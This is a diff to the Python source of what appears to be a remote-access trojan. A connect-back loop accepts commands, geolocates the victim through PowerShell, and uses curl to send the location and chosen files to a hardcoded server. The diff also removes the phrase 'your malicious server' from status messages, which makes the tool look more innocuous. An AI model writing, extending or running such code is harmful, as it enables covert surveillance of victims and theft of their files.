@@ -7,6 +7,8 @@ import sys
 import webbrowser
 import json
 SERVER_URL = "http://192.168.88.105:2020"
+import subprocess
+import shlex
 def get_location_and_send():
     ps_command = r'''
     Add-Type -AssemblyName System.Device
@@ -44,24 +46,14 @@ def get_location_and_send():
     '''
     ps_result = subprocess.run(
         ["powershell", "-NoProfile", "-Command", ps_command],
-        capture_output=True,
-        text=True
+        capture_output=True, text=True
     )
-    if not ps_result.stdout:
-        print("No location...")
-    location_json = ps_result.stdout.strip()
-    curl_cmd = [
-        "curl",
-        "-X", "POST",
-        SERVER_URL,
-        "-H", "Content-Type: application/json",
-        "-d", location_json
-    ]
-    subprocess.run(
-        curl_cmd,
-        capture_output=True,
-        text=True
-    )
+    location_text = ps_result.stdout.strip()
+    if not location_text:
+        print("No location found")
+        return False
+    curl_cmd = f'curl -X POST {SERVER_URL}/get-location -H "Content-Type: text/plain" -d "{location_text}"'
+    subprocess.run(curl_cmd, shell=True)
     return True
 def send_files(args):
     files_to_send = args[1:]
@@ -109,11 +101,12 @@ def connect_back():
                 continue
             if cmd == "get-location":
                 if get_location_and_send() == True:
-                    s.send(f"{"Location has been sent to your malicious server".encode("utf-8")}\n")
+                    s.send(b"Location has been sent to the server\n")
+                continue
             if cmd.startswith("send"):
                 args_files = cmd.split()
                 send_files(args_files)
-                s.send(f"{"Files has been sent to your malicious server".encode("utf-8")}\n")
+                s.send(b"Files have been sent to the server\n")
                 continue
             if cmd.lower() == "exit":
                 break
